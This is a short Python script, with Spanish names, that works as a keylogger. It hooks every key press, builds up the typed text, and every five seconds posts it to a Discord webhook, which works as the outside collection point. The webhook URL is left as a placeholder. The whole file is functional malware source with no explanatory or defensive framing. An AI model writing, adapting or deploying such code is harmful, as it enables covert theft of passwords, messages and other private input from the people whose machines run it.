import keyboard
import requests
import threading
import time

webhook_url = "YOUR DISCORD webhook_url"

texto_actual = ""
lock = threading.Lock()

def enviar_a_discord(texto):
    if texto.strip(): 
        requests.post(webhook_url, json={"content": f"🖊️ = 🖊️ {texto}"})

def temporizador_envio():
    global texto_actual
    while True:
        time.sleep(5) 
        with lock:
            if texto_actual:
                enviar_a_discord(texto_actual)
                texto_actual = ""

def on_key(event):
    global texto_actual
    with lock:
        if event.name == "space":
            texto_actual += " "
        elif event.name == "enter":
            texto_actual += "\n"
        elif len(event.name) == 1:
            texto_actual += event.name
        elif event.name == "backspace":
            texto_actual = texto_actual[:-1]
     


hilo = threading.Thread(target=temporizador_envio, daemon=True)
hilo.start()


keyboard.on_press(on_key)
keyboard.wait('esc')
